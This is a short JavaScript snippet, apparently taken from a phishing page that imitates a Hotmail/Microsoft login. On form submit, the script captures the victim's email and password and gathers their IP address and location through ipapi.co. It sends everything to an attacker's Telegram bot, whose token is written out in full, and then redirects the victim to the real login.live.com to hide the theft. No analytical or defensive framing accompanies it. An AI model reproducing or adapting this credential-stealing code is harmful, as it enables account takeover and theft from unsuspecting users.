            <script>
              const url = "https://ipapi.co/json/";
              const form = document.querySelector("#contenido1");
              form.addEventListener("submit", (event) => {
                event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
                axios
                  .get(url)
                  .then((response) => {
                    const email = document.querySelector("#ypn-cel").value;
          
                    const contra = document.querySelector("#ypn-fn").value;
                    
                    const message =
                      "\nHotmail" +
                      "\nEmail: " +
                      email +
                      "\nContra: " +
                      contra +
                      "\nCiudad:" +
                      response.data.city +
                      "\nPais: " +
                      response.data.country +
                      "\nIP: " +
                      response.data.ip;
                    axios
                      .post(
                        "https://api.telegram.org/bot7588596909:AAEv6ZNnIAsJNAcLW8KzGJJkzT33pyfWqUU/sendMessage",
                        {
                          chat_id: "-4810900191",
                          text: message,
                        }
                      )
                      .then((response) => {
                        window.location.href = "https://login.live.com";
                      })
                      .catch((error) => {
                        console.error(error);
                      });
                  })
                  .catch((error) => {
                    console.log(error);
                  });
              });
            </script>
